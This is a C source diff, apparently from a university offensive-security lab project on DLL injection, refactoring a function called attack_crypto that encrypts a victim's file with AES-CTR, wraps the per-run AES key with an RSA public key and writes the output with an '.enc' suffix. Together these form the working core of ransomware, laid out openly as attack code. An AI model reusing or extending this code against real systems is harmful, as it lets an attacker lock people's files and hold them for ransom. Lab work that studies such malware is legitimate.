@@ -1,3 +1,5 @@
+#include "get_relative_path.h"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -120,24 +122,31 @@ static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, con
 }
 
 /* Initialize AES key for the whole session */
-static void ensure_aes_key_loaded(void)
+static int ensure_aes_key_loaded(void)
 {
     if (key_loaded)
-        return;
+        return 0;
+
+    // Get public key path and aes path
+    char public_rsa[MAX_PATH];
+    if (get_relative_path(public_rsa, sizeof(public_rsa), "public_key.pem") != 0) {
+        return 1;
+    }
+
+    char aes[MAX_PATH];
+    if (get_relative_path(aes, sizeof(aes), "aes_key.bin") != 0) {
+        return 1;
+    }
 
     rng_init();
 
     /* Always generate a new key once per run */
     random_bytes(aes_key, KEY_SIZE);
 
-    save_encrypted_key_rsa(
-    aes_key,
-    KEY_SIZE,
-    "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/public_key.pem",
-    "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/aes_key.bin"
-    );
+    save_encrypted_key_rsa(aes_key, KEY_SIZE, public_rsa, aes);
 
     key_loaded = true;
+    return 0;
 }
 
 /* Encrypt one file */
@@ -193,6 +202,23 @@ void encrypt_file_aes_ctr(const char *source, const char *target, const unsigned
     fclose(out);
 }
 
+int make_enc_path(const char *input, char *output, size_t output_size)
+{
+    if (!input || !output)
+        return 1;
+
+    size_t len = strlen(input);
+
+    if (len + 5 > output_size) { /* +4 for ".enc", +1 for '\0' */
+        return 1;
+    }
+
+    memcpy(output, input, len);
+    strcpy(output + len, ".enc"); // safer, copies null terminator
+
+    return 0;
+}
+
 /* Public API for cleaning the critical memory - plaintext AES key and mbedtls state variables */
 void crypto_cleanup(void)
 {
@@ -204,9 +230,16 @@ void crypto_cleanup(void)
 }
 
 /* Public API for encryption */
-int attack_crypto(const char *input_file, const char *output_file)
+int attack_crypto(const char *input_file)
 {
+    char output_file[MAX_PATH];
+
     ensure_aes_key_loaded();
+
+    if (make_enc_path(input_file, output_file, sizeof(output_file)) != 0) {
+        return 1;
+    }
+
     encrypt_file_aes_ctr(input_file, output_file, aes_key);
     return 0;
 }
